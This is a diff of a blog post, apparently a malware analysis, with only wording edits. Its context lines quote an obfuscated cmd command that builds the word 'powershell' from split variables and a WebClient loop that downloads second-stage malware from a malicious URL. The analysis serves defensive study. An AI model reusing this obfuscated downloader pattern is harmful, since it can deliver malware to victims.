@@ -131,8 +131,7 @@ cmd /c set _a1=pow&& set _a2=ersh&& set _a3=ell&& call %_a1%%_a2%%_a3% $ULjzHtTr
 
 This is somewhat confusing to read... but not so much if we clean it up a little bit.
 
-Following is a _manually-decoded_ version of the command line just to make it easier to read. I wrote it on different lines and replaced the original names of important variables with more meaningful names.
-
+Here is a _manually-decoded_ version of the command line just to make it easier to read. I wrote it on different lines and replaced the original names of important variables with more meaningful names.
 
 ```
 cmd /c
@@ -170,7 +169,7 @@ foreach($url in 'http://wijdqwbntuqwebqweqwizxc.com/stata/index.php?rnd=59978,?r
 
 The first line is a call to `cmd /c` to execute the command that follows. The second line sets three environment variables, which are then concatenated on line 5 into the string `powershell` which is the argument of the command `call`.
 
-Following down the lines we see how a `WebClient` object is created (I renamed it to `$connection`); how the Microsoft Word version is read and assigned to the `user-agent` property of the `$connection` object; how the path where the second stage malware is to be saved to is set. The `foreach` loop is where the actual download happens. Note that the loop is executed only one time because of the `break` instruction and regardless of how many `$urls` are obtained from the `Split` operation. Indeed the `Split` and all those other random strings assignments spread over are just garbage to make the code more difficult to read and reverse.
+Following the lines down we see how a `WebClient` object is created (I renamed it to `$connection`); how the Microsoft Word version is read and assigned to the `user-agent` property of the `$connection` object; how the path where the second stage malware is to be saved to is set. The `foreach` loop is where the actual download happens. Note that the loop is executed only one time because of the `break` instruction and regardless of how many `$urls` are obtained from the `Split` operation. Indeed the `Split` and all those other random strings assignments spread over are just garbage to make the code more difficult to read and reverse.
 
 I tried to download the second stage using [Malzilla](http://malzilla.sourceforge.net/) but unfortunately without success: at this time the domain is dead or already taken down.
 
